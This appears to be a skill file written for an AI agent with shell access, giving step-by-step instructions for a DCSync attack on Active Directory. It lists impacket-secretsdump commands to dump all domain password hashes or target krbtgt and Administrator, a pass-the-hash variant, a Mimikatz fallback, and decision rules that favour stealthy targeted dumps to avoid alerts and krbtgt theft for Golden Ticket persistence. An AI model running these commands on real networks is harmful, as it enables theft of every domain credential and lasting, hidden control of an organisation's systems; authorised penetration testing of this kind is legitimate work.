---
name: dcsync
description: "DCSync attack — replicate domain credentials via Directory Replication Service"
allowed-tools: Bash
metadata:
  subdomain: active-directory
  mitre_attack: T1003.006
  when_to_use: "dcsync, secretsdump, replication, GetChanges, GetChangesAll, krbtgt"
  tags: active-directory, credential-access, privilege-escalation
---

# DCSync — Domain Credential Replication

Impersonates a Domain Controller to request password data via the Directory Replication Service (MS-DRSR). Requires `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` rights — typically held by Domain Admins, Enterprise Admins, and DC machine accounts.

## 1. Check Replication Rights

```python
# List principals with DCSync rights from KnowledgeGraph
dcsync_check()
```

If `dcsync_check()` returns any non-DC principal, that account is an instant domain compromise vector.

**BloodHound Cypher (alternative)**
```bash
neo4j-cypher 'MATCH p=(n)-[:GetChanges|GetChangesAll*1..]->(d:Domain) RETURN n.name, labels(n)'
```

## 2. Execute DCSync

**Full dump — all accounts**
```bash
impacket-secretsdump '<DOMAIN>/<USER>:<PASS>'@<DC_IP> -just-dc-ntlm -outputfile dcsync_dump
```

**Targeted — specific users (stealthier)**
```bash
# krbtgt — for Golden Ticket creation
impacket-secretsdump '<DOMAIN>/<USER>:<PASS>'@<DC_IP> -just-dc-user krbtgt -outputfile dcsync_krbtgt

# Administrator
impacket-secretsdump '<DOMAIN>/<USER>:<PASS>'@<DC_IP> -just-dc-user Administrator -outputfile dcsync_admin
```

**Via Pass-the-Hash**
```bash
impacket-secretsdump '<DOMAIN>/<USER>'@<DC_IP> -hashes ':<NT_HASH>' -just-dc -outputfile dcsync_dump
```

**Including Kerberos keys**
```bash
impacket-secretsdump '<DOMAIN>/<USER>:<PASS>'@<DC_IP> -just-dc -outputfile dcsync_full
```

## 3. Output Format

```
# secretsdump output:
<DOMAIN>\<USER>:<RID>:<LM_HASH>:<NT_HASH>:::

# Priority extraction targets:
# Administrator (RID 500)  — domain admin access
# krbtgt                    — Golden Ticket forge material
# Machine accounts ($)     — lateral movement via S4U
```

## 4. Decision Gates

| Condition | Action |
|-----------|--------|
| `dcsync_check()` shows non-DC principal | Compromise that principal, then DCSync |
| Have DA creds | `-just-dc-user krbtgt` first for Golden Ticket |
| Have DA hash only | Use `-hashes :<NT_HASH>` for pass-the-hash DCSync |
| Need stealth | Target single users with `-just-dc-user` instead of full dump |
| Replication rights but secretsdump blocked | Use Mimikatz `lsadump::dcsync /domain:<DOMAIN> /user:krbtgt` from Windows |

## Anti-Patterns
- Running a full `-just-dc` dump when only krbtgt is needed — this generates massive replication traffic and triggers alerts.
- Not checking `dcsync_check()` before attempting — wastes time if no principals have replication rights.
- Forgetting to extract krbtgt — this is the most valuable target (enables Golden Ticket persistence).
